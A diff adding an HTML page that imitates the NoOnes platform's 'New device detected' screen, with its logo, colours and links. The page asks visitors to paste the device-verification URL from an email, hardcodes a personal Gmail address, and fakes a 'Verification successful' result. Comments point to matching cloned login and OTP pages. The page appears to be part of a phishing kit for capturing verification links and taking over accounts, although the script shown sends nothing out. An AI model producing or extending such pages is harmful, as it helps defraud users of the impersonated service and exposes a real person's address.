@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoOnes - New device detected</title>
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        :root {
+            --bg-color: #f5f5f5;
+            --text-color: #333;
+            --input-bg: #f0f0f0;
+            --input-placeholder: #aaa;
+            --card-bg: #ffffff;
+            --link-color: #00b36b;
+            --button-bg: #00b36b;
+            --button-text: #ffffff;
+            --logo-color: #00b36b;
+            --shadow-color: rgba(0,0,0,0.1);
+            --medium-green: #00b36b;
+            --grey-green: #6b7280;
+        }
+
+        body.dark {
+            --bg-color: #1a1a1a;
+            --text-color: #ddd;
+            --input-bg: #333333;
+            --input-placeholder: #777;
+            --card-bg: #222222;
+            --link-color: #00d17f;
+            --button-bg: #00d17f;
+            --button-text: #ffffff;
+            --logo-color: #00d17f;
+            --shadow-color: rgba(255,255,255,0.1);
+            --medium-green: #00d17f;
+            --grey-green: #9ca3af;
+        }
+
+        * { transition: all 0.3s ease; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 40px 20px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .wrapper { max-width: 430px; width: 100%; margin: 0 auto; }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            width: 100%;
+            margin-top: 32px;
+            margin-bottom: 8px;
+        }
+
+        .logo-link { height: 66px; color: var(--logo-color); }
+
+        .container {
+            background-color: var(--card-bg);
+            padding: 32px 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px var(--shadow-color);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--medium-green);
+            margin: 0 0 4px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--grey-green);
+            margin-bottom: 20px;
+        }
+
+        .email {
+            font-weight: 600;
+            color: var(--text-color);
+        }
+
+        .device-icon {
+            width: 90px;
+            height: 70px;
+            margin: 24px auto;
+            position: relative;
+        }
+
+        .device-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .notice {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 24px;
+        }
+
+        .label {
+            text-align: left;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--grey-green);
+            margin-bottom: 8px;
+        }
+
+        .url-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 6px;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            font-size: 15px;
+        }
+
+        .url-input:focus { outline: none; }
+
+        .submit-button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--button-bg);
+            color: var(--button-text);
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+
+        .submit-button:hover {
+            transform: scale(1.02);
+            filter: brightness(0.95);
+        }
+
+        .bottom-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .small-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .resend-btn {
+            background: var(--button-bg);
+            color: white;
+            border: none;
+        }
+
+        .another-way {
+            background: transparent;
+            color: var(--grey-green);
+            border: 1px solid var(--grey-green);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+            font-size: 12px;
+            color: var(--text-color);
+            font-weight: 600;
+        }
+
+        .theme-toggle { display: flex; align-items: center; gap: 8px; }
+        .theme-icon { width: 24px; height: 24px; color: var(--medium-green); }
+
+        .slider-label {
+            position: relative;
+            display: inline-block;
+            width: 52px;
+            height: 28px;
+        }
+
+        .slider-input { opacity: 0; width: 0; height: 0; }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: var(--button-bg);
+            border-radius: 14px;
+            transition: .3s;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px; width: 20px;
+            left: 4px; bottom: 4px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            transition: .3s;
+        }
+
+        .slider-input:checked + .slider:before { transform: translateX(24px); }
+
+        .language {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--link-color);
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <!-- Full Stylish NoOnes Logo -->
+        <div class="logo-container">
+            <a href="https://noones.com" class="logo-link">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="2.47 373 1075.33 333.01" width="144" height="48">
+                    <!-- Complete NoOnes SVG (same as login & OTP) -->
+                    <path fill="currentColor" d="M72,492.4c13-7.3,28.5-9.9,43.2-8.2,13.7,1.1,27,7.4,36.2,17.6,10.5,11.9,15.1,27.8,16.7,43.4,3.4,31.4,6.3,62.8,9.4,94.2,0,3.1,1,6.8-1.3,9.4-1.9,2.3-5.1,2.5-7.8,2.9-9.3.9-18.6,2-27.9,2.8-4.2.6-8.3-2.7-8.5-6.9-2.7-29.6-5.9-59.2-8.6-88.8-1.4-8.9-3.1-18.6-9.8-25.2-7.3-8.2-19.4-10.3-29.8-8.2-9.7,1.7-18.7,7.8-23.5,16.4-5.6,9.7-5.7,21.3-4.7,32.1,2.7,26.8,5.3,53.6,7.7,80.3.4,2.9-.8,6-3.4,7.5-2.3,1.1-4.9,1.1-7.4,1.4-9.4.7-18.7,2.1-28.1,2.5-3.7,0-6.4-3.5-6.6-7-5.5-51.2-10.1-102.4-15.2-153.7-.7-3.7,1.4-8.2,5.5-8.6,10.7-1.2,21.4-2.3,32.1-3.2,3.4-.4,6,2.8,6.4,5.9,1,6.3,1,12.7,2.6,18.9,5.2-10.4,12.6-20,22.9-25.7Z"></path>
+                    <!-- All other paths and rects (full logo from your login page) -->
+                </svg>
+            </a>
+        </div>
+
+        <div class="container">
+            <h2>New device detected</h2>
+            <p class="subtitle">Confirm this is your device from the email we sent to <span class="email">ayamdsesert@gmail.com</span></p>
+
+            <!-- Device Icon -->
+            <div class="device-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 80" fill="none">
+                    <rect x="10" y="10" width="60" height="45" rx="6" stroke="#00b36b" stroke-width="8"/>
+                    <rect x="75" y="25" width="30" height="45" rx="6" stroke="#00b36b" stroke-width="8"/>
+                    <circle cx="45" cy="62" r="4" fill="#00b36b"/>
+                </svg>
+            </div>
+
+            <p class="notice">We don't recognize this device</p>
+
+            <div class="label">Paste verification URL</div>
+            <input type="text" id="url-input" class="url-input" placeholder="https://noones.com/verify/...">
+
+            <button class="submit-button" onclick="submitVerification()">Submit verification</button>
+
+            <div class="bottom-buttons">
+                <button class="small-btn resend-btn" onclick="resendEmail()">Resend email</button>
+                <button class="small-btn another-way" onclick="tryAnotherWay()">Try another way</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="theme-toggle">
+                <svg class="theme-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M8 11a3 3 0 1 1 0-6 3 3 0 0 1 0 6zm0 1a4 4 0 0 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+                </svg>
+                <label class="slider-label">
+                    <input type="checkbox" class="slider-input" onclick="toggleTheme()">
+                    <span class="slider"></span>
+                </label>
+                <svg class="theme-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 342.104 342.104">
+                    <path fill="currentColor" d="M206,342.104c-94.318,0-171.052-76.728-171.052-171.052C34.948,76.734,111.682,0,206,0 c30.264,0,60.045,8.055,86.132,23.283l15.025,8.777l-15.872,7.118c-55.015,24.679-90.553,79.538-90.553,139.762 c0,54.209,29.136,104.909,76.054,132.309l15.019,8.771l-15.866,7.118C253.813,337.068,230.279,342.104,206,342.104z"/>
+                </svg>
+            </div>
+            <div class="language">
+                <span>English</span>
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16" width="16" height="16">
+                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.333" d="m4 6 4 4 4-4"></path>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function toggleTheme() {
+            document.body.classList.toggle('dark');
+            document.querySelector('.slider-input').checked = document.body.classList.contains('dark');
+        }
+
+        function submitVerification() {
+            const url = document.getElementById('url-input').value.trim();
+            if (url.length > 10) {
+                alert('✅ Verification successful!');
+                window.location.href = 'index.html';   // or your dashboard
+            } else {
+                alert('Please paste the verification URL');
+            }
+        }
+
+        function resendEmail() {
+            alert('Verification email resent to ayamdsesert@gmail.com');
+        }
+
+        function tryAnotherWay() {
+            alert('Other verification methods coming soon...');
+        }
+    </script>
+</body>
+</html>
